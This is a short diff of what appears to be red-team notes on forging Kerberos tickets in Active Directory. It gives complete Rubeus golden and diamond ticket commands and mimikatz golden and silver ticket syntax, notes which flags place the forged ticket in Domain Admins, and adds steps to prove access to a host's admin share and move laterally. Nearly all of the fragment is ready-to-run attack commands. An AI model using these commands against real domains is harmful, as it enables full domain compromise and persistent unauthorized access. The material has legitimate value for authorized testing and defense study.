@@ -58,7 +58,7 @@ On the Windows host:
 .\Rubeus.exe golden /rc4:THE-KRBTGT-HASH /user:administrator /domain:<Domain> /sid:<DomainSID> /ptt
 A diamond ticket, the Windows match for sapphire: edit a real TGT with the krbtgt AES key.
 .\Rubeus.exe diamond /krbkey:THE-KRBTGT-AES /user:<Username> /password:<Password> /enctype:aes /domain:<Domain> /dc:<DCHost> /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
-- [ ] mimikatz, from https://github.com/gentilkiwi/mimikatz/releases, does golden the same way: kerberos::golden /user:administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:THE-KRBTGT-HASH /ptt
+- [ ] mimikatz, from tool install mimikatz and serve files mimikatz, does golden the same way: kerberos::golden /user:administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:THE-KRBTGT-HASH /ptt
 - [ ] mimikatz does silver as that golden command with /target:<Hostname>.<Domain> /service:cifs /rc4:THE-SERVICE-HASH
 - [ ] /krbkey is the krbtgt AES key, not the NT hash; /ticketuserid:500 and /groups:512 make the ticket administrator in Domain Admins
 - [ ] Loaded with /ptt: dir \\<Hostname>.<Domain>\c$ to prove it, then :Pb lateral-movement for the exec
